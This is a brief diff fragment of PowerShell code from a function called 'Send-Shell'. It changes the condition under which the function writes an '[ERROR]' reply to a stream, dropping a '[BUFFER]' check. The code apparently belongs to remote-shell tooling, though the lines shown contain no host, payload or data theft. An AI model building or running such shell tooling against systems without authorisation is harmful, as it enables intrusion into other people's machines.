@@ -59,7 +59,7 @@ function Send-Shell
                 }
             }else{
                 try{
-                    if ($data.Contains("[BUFFER]") -or $data.Contains("[CHECKSUM]")){
+                    if ($data.Contains("[CHECKSUM]")){
                         $StreamWriter.Write('[ERROR]')
                         $StreamWriter.Flush()
                     }else{
